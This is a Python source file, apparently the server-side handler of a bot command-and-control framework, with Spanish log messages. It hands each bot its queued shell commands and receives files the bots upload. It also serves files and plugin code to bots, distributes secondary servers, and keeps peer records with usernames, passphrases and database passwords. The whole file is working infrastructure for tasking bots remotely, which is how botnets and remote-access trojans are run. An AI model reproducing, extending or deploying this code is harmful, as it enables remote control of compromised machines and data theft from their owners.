import re
import importlib
import threading
from inspect import getfullargspec, isfunction
from os.path import isfile, isdir, basename, splitext
from os import listdir, walk

from modules.UI import rename_order

from utils.Ciphers import generate_uniqkey
from utils.sys_utils import create_folder
from utils.Wrappers import wrap
from utils.UI import debug
from utils.sys_utils import uniqdata
from utils.Checks import check_int
from utils.Checks import check_values
from utils.Wrappers import wrap_file
from utils.Checks import key_check_in_dict
from utils.sys_utils import bytes_convert

# Configuración

from conf import global_conf

# Configuración entre módulos

cipher_file = True
parse_args = None

complements = global_conf.databases['complements']
nomenclature_error = '¡No está siguiendo la nomenclatura necesaria!'
db_dirname = global_conf.databases['database']
profiles = global_conf.databases['profiles']
share_folder = global_conf.databases['share']

def execute(data, bot_id, log):

    if not (check_values.check(data, 2) == True):

        log.logger(nomenclature_error, debug.WAR)

        return(False, None)

    (key, value) = data

    profile = '%s/%s/%s' % (db_dirname, profiles, bot_id)

    create_folder.create(profile)

    execute = True
    result = None
    bot_id = str(bot_id)

    if (key == 'ping'):

        log.logger('ping ... haciendo pong ...', debug.INF) 
        result = (1, 'pong')

    elif (key == 'SEND-FILE'):

        if (check_values.check(value, 2) == False):

            log.logger(nomenclature_error, debug.WAR)
            execute = False

        else:

            _content = value[0]
            filename = basename(str(value[1]))
            file_path = '{}/{}'.format(profile, filename)
            _bak_file_path = rename_order.rename(file_path)

            log.logger('Verificando la existencia del archivo ...', debug.INF)

            if not (_bak_file_path == False):

                log.logger('El archivo: "{}" existe, renombrando a: "{}"'.format(file_path, _bak_file_path), debug.WAR)

                file_path = _bak_file_path

            else:

                log.logger('No existe: "{}", procediendo a escribir ...'.format(file_path), debug.PER)

            log.logger('Escribiendo: "{}" ...'.format(file_path), debug.PER)

            try:

                if (cipher_file == True):

                    wrap_file.wrap(file_path, wrap._new_passwd, _content)

                else:

                    with open(file_path, 'wb') as file_object:

                        file_object.write(bytes_convert.convert(_content))

            except Exception as Except:
                
                log.logger('Ocurrio un error escribiendo a: "{}"'.format(file_path), debug.WAR)
                execute = False

            else:

                log.logger('Escrito: "{}" ...'.format(file_path), debug.PER)

    elif (key == 'RECV-FILE'):

        file_path = '{}/{}/{}'.format(share_folder, bot_id, basename(str(value)))

        if (isfile(file_path)):

            log.logger('Enviando el archivo: "{}" ...'.format(file_path), debug.PER)

            try:

                if (cipher_file == True):

                    result = wrap_file.wrap(file_path, wrap._new_passwd)

                    if (result == False):

                        log.logger('{}, no se pudo desencriptar..., Intentando sin desencriptar...'.format(file_path), debug.WAR)

                if (result == False) or (cipher_file == False):

                    with open(file_path, 'rb') as file_object:

                        result = file_object.read()

            except Exception as Except:

                log.logger('Ocurrio un error leyendo a: "{}"'.format(file_path))
                execute = False

            else:

                log.logger('Enviando ...', debug.WAR)

        else:

            log.logger('El archivo: "{}", no existe ...'.format(basename(file_path)), debug.COM)

            result = '0'
            execute = False

    elif (key == 'SHELL-EXEC'):

        result = []
        _commands = wrap.read(bot_id, 'commands', separate=True)
        _index = 0

        if not (_commands == False):

            try:

                if (len(_commands) == 0):

                    raise IndexError

                for _ in _commands:

                    if (_[0] == False):

                        result.append(_[1])

                        if (wrap.write(bot_id, 'commands', True, target=wrap.TARGET_SUBINDEX_UPDATE, array_subindex=(_index, 0), separate=True) == True):

                            log.logger('No se volverá a ejecutar "{}" ...'.format(_[1]), debug.WAR)
                        
                        else:

                            log.logger('Hubo un error actualizando los datos del comando: "{}"'.format(_[1]))

                    _index += 1

            except IndexError:

                log.logger('Aún no hay comandos ingresados por parte del encargado de administrar el bot', debug.WAR)

                result = (False, None)

            else:

                if (len(result) > 0):

                    log.logger('Ejecutara "{}"'.format(', '.join(result)), debug.PER)

                    result = (True, result)

                else:

                    log.logger('No se puede ejecutar comandos, ya que no están disponibles!', debug.WAR)

                    result = (False, None)

        else:

            log.logger('Ocurrio un error leyendo los comandos de: "{}"'.format(bot_id), debug.WAR)
            execute = False

    elif (key == 'addserver'):
        
        bot_servers = wrap.read(bot_id, 'servers', separate=True)

        if not (bot_servers == False):

            result = bot_servers
            _servers = []

            for _ in result:

                _servers.append(_[0])

            if not (len(_servers) == 0):

                log.logger('Enviando servidores secundarios: "{}"'.format(', '.join(_servers)), debug.WAR)

            else:

                log.logger('No hay servidores secundarios disponibles ...', debug.WAR)
                execute = False

        else:

            log.logger('Ocurrio un error leyendo los servidores secundario de: "{}"'.format(bot_id), debug.COM)
            execute = False

    elif (key == 'getPeers'):

        log.logger('Leyendo base de datos de los puntos ...', debug.INF)
        
        _data = wrap.getall(agent=wrap.USE_PEER)

        if (len(_data) > 0):

            log.logger('Enviando puntos de la red ...', debug.INF)

            result = uniqdata.uniqdata(list(list(_data.values())[0].values())[0])

        else:

            log.logger('Aún no hay puntos en la red ...', debug.COM)

            execute = False

    elif (key == 'addPeer'):

        if not (isinstance(value, dict)):

            log.logger('El tipo de dato de los puntos a agregar no es un diccionario ...', debug.WAR)
            execute = False

        else:

            if (None in [log.logger('{}, No está definido'.format(x), debug.WAR) for x in ['url', 'username', 'passphrase', 'db_passwd', 'hash'] if (key_check_in_dict.check(value, x) == False)]):

                execute = False

            else:

                _result = []
                _data = wrap.read(bot_id, 'peers', agent=wrap.USE_PEER)
                _hash = value['hash']
                _exists = value in _data if not (_data == False) else False

                log.logger('Agregando punto en la red -> {} ({})'.format(value['url'], value['hash']), debug.PER)

                if (_data == False):

                    if (wrap.add(bot_id, {'peers':[value]}, agent=wrap.USE_PEER) == True):

                        log.logger('Primer punto de la red agregado ...', debug.INF)

                    else:

                        log.logger('Hubo un error agregando un punto de la red por primera vez ...', debug.COM)

                        execute = False

                else:

                    if (_exists == True):

                        log.logger('El punto de la red ya existe!', debug.WAR)
                        log.logger('Actualizando datos ...', debug.INF)

                    else:

                        log.logger('Nuevo punto en la red detectado ...', debug.INF)

                    _result.append(value)

                    for _ in _data:

                        if (_['hash'] == _hash):

                            log.logger('Coincidencia: "%s"; Editando ...' % (_hash), debug.PER)

                            _['url'] = value['url']
                            _['db_passwd'] = value['db_passwd']
                            _['passphrase'] = value['passphrase']
                            _['username'] = value['username']

                        _result.append(_)

                    _result = uniqdata.uniqdata(_result)

                    if (wrap.add(bot_id, {'peers':_result}, agent=wrap.USE_PEER) == True):

                        log.logger('Puntos escritos con éxito!', debug.INF)

                    else:

                        log.logger('Error escribiendo datos de los puntos de la red ...', debug.COM)

    elif (key == 'getQueue'):

        result = wrap.read(bot_id, 'Queue', separate=True)

        if not (result == []):

            if (wrap.write(bot_id, 'Queue', None, separate=True, target=wrap.TARGET_UNSET) == True):

                log.logger('¡Se reiniciaron los comandos en cola!', debug.WAR)

            else:

                log.logger('Hubo un error actualizando los comandos en cola...', debug.COM)

        else:

            log.logger('Aún no hay comandos en cola', debug.WAR)
    
    elif (key == 'loadModule'):

        moduleName = basename(str(value)).strip()

        if not (moduleName == '') and not (re.search(r'(?=\.+)', moduleName)):

            log.logger('Va a cargar un complemento...', debug.WAR)

            # Por ahora la ruta se especifica de esta forma porque sólo es válida para arquitecturas de 32bits con SO Windows

            modulePath = '{}/{}/rook/src/init.py'.format(global_conf.databases['complements'], moduleName)

            log.logger('Cargando a "{}" ...'.format(modulePath), debug.PER)

            if (isfile(modulePath)):

                with open(modulePath, 'rb') as file_object:

                    result = file_object.read()

                log.logger('¡Complemento cargado!', debug.INF)

            else:

                log.logger('{}, No existe como complemento ...'.format(moduleName), debug.WAR)
                execute = False

        else:

            log.logger('El nombre del complemento no es válido')
            execute = False

    elif (key == 'resultModule'):

        if (check_values.check(value, 4) == False):

            log.logger(nomenclature_error, debug.WAR)
            execute = False

        else:

            log.logger('Envío un resultado de un complemento ...', debug.INF)

            config = {
                    
                    'result':value[1],
                    'log':log,
                    'bot_id':bot_id,
                    'remote_addr':log.address,
                    'function':value[2],
                    'exception':value[3],
                    'args':parse_args
                    
                    }

            moduleName = basename(str(value[0])).strip()
            modulePath = '{}.{}.evie.init'.format(global_conf.databases['complements'], moduleName).replace('/', '.')

            if not (moduleName == '') and not (re.search(r'(?=\.+)', moduleName)):

                log.logger('Interactuando con el complemento "{}" ...'.format(moduleName), debug.PER)

                try:

                    data = {}
                    mod = importlib.reload(importlib.import_module(modulePath))

                    def moduleMain(*args, **kwargs):

                        try:

                            mod.main(*args, **kwargs)

                        except Exception as Except:

                            log.logger('Ocurrio un error al ejecutar el complemento "{}". Excepción: "{}"'.format(moduleName, Except), debug.WAR)

                    if (hasattr(mod, 'main') == True):

                        if not (isfunction(getattr(mod, 'main')) == True):

                            log.logger('¡main, no es una función!', debug.WAR)

                            return(False, None)

                    else:

                        log.logger('La función "main" no está definida', debug.WAR)

                        return(False, None)

                    for _ in getfullargspec(mod.main).args:

                        if not (_ in config):

                            log.logger('{} no es un parámetro válido'.format(_), debug.WAR)

                            return(False, None)

                        else:

                            data[_] = config[_]

                    mod_thread = threading.Thread(target=moduleMain, name=generate_uniqkey.generate(), kwargs=data)
                    mod_thread.start()

                except ModuleNotFoundError:

                    log.logger('¡El complemento "{}" no existe!'.format(moduleName), debug.WAR)
                    execute = False

                except Exception as Except:

                    log.logger('Error importando "{}": {}'.format(moduleName, Except), debug.WAR)
                    execute = False

                else:

                    log.logger('Nuevo hilo iniciado ({}) para {} ...'.format(mod_thread.name, moduleName), debug.PER)

            else:

                log.logger('El nombre del complemento no es válido', debug.WAR)
                execute = False

    else:

        access = wrap.write(bot_id, 'data', data, separate=True)

        if (access == True):

            log.logger('¡Datos agregados con éxito!', debug.INF)

        else:
            
            log.logger('¡Hubo un error desconocido al agregar datos al almacén!', debug.COM)
            execute = False

    return(execute, result)
